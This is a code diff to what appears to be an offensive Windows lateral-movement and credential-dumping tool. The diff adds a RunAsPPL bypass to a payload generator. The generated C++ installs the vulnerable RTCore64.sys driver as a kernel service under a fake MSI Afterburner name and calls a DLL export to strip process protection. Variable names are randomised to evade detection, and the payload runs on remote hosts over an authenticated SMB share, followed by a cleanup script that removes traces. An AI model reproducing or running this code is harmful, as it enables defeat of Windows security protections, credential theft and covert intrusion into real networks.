@@ -215,6 +215,9 @@ class SMBEXECShell():
                     tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                     command2run = command2run[command2run.find('&&') + 3:]
                     tmphold = self.send_data(command2run[:command2run.find('&')], addr)
+                    if command2run.find('cleanup.bat') != -1:
+                        command2run = command2run[command2run.find('&&') + 3:]
+                        tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                 else:
                     printnlog('{}: {}'.format(addr, tmphold))
 
@@ -1606,7 +1609,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))
 
 
-def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
+def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, runasppl):
     load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
     lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
     proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
@@ -1642,6 +1645,10 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
     e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
     x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
     period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
 
     exe_payload = ''
     exe_payload += '#include <windows.h>\n'
@@ -1651,6 +1658,10 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
     exe_payload += '#include <tlhelp32.h>\n'
     exe_payload += '#include <processthreadsapi.h>\n'
     exe_payload += '#include <lmcons.h>\n'
+    if runasppl:
+        exe_payload += '#include <process.h>\n'
+        exe_payload += '#include <chrono>\n'
+        exe_payload += '#include <thread>\n'
     exe_payload += '#include <sstream>\n'
     exe_payload += '\n'
     exe_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
@@ -1761,7 +1772,20 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
     exe_payload += '    return %s;\n' % (wString)
     exe_payload += '}\n'
     exe_payload += '\n'
+    if runasppl:
+        exe_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
     exe_payload += 'int main(){\n'
+    if runasppl:
+        exe_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
+        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
+        exe_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
+        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
+        exe_payload += '    system("net start RTCore64");\n'
+        exe_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
+        exe_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
+        exe_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
+        exe_payload += '    %s(_getpid());\n' % (sAbout)
+        exe_payload += '    FreeLibrary(%s);\n' % (s1)
     exe_payload += '    HANDLE %s;\n' % (hToken)
     exe_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
     exe_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
@@ -1822,7 +1846,7 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
     exe_payload += '    CloseHandle(%s);\n' % (outFile)
     exe_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
     exe_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
-    exe_payload += ''
+    exe_payload += '\n'
     exe_payload += '    return 0;\n'
     exe_payload += '}\n'
     exe_payload += ''
@@ -1830,6 +1854,19 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter):
     with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
         f.write(exe_payload)
         f.close()
+
+    if runasppl:
+        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
+        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
+        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
+            f.write('net stop RTCore64\n')
+            f.write('sc delete RTCore64\n')
+            f.write(r'del C:\Windows\Temp\RTCore64.sys')
+            f.close()
+
+        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))
 
     os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -o /var/tmp/{}/{}.exe -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
@@ -2030,7 +2067,7 @@ def alt_exec_exit():
     sys.exit(0)
 
 
-def config_check():
+def config_check(thread1):
     fail = 0
     sockfail = 0
     printnlog('{}[{}Checking proxychains config{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
@@ -2174,7 +2211,7 @@ def alt_exec(relayx, reaper_command):
             os.system('touch {}/exit'.format(cwd))
             thread1.join()
             alt_exec_exit()
-        config_check()
+        config_check(thread1)
         relayx_dump(reaper_command)
         os.system('touch {}/exit'.format(cwd))
         thread1.join()
@@ -2539,12 +2576,14 @@ if __name__ == '__main__':
             print('Error you are missing {}/smbexec-shellless.py go get it from github'.format(cwd))
             sys.exit(1)
 
-    if options.runasppl and options.method != 'smbexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec
+    if options.runasppl and options.method == 'atexec':  # check to see if they are trying to run runasppl bypass with something other than smbexec or wmiexec
         printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
         sys.exit(0)
 
-    if options.runasppl and options.payload != "msbuild":  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
-        printnlog('{}[!]{} RunAsPPL Bypass only works with the MsBuild payload'.format(color_RED, color_reset))
+    runaspplpayloads = ['msbuild', 'exe-rtlcp']
+
+    if options.runasppl and options.payload not in runaspplpayloads:  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
+        printnlog('{}[!]{} RunAsPPL Bypass only works with the MsBuild or exe-rtlcp payloads'.format(color_RED, color_reset))
         sys.exit(0)
 
     if options.runasppl:
@@ -2748,7 +2787,7 @@ if __name__ == '__main__':
         elif options.payload == 'regsvr32-mdwd':
             addresses_file = gen_payload_regsvr32_mdwd(share_name, payload_name, addresses)
         elif options.payload == 'exe-rtlcp':
-            gen_payload_exe_rtlcp(share_name, payload_name, drive_letter)
+            gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
 
         if not options.oe:
             printnlog('\n[This is where the fun begins]\n{} Executing {} via {}\n'.format(green_plus, options.payload, options.method))
@@ -2758,7 +2797,11 @@ if __name__ == '__main__':
         elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd':
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
         elif options.payload == 'exe-mdwdpss' or options.payload == 'exe-mdwd' or options.payload == 'exe-rtlcp':
-            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+            cleanup = ''
+            if options.runasppl:
+                cleanup += r'&& {}:\cleanup.bat '.format(drive_letter)
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe {}&& net use {}: /delete /yes'.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, cleanup, drive_letter)
+
         elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd':
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
 
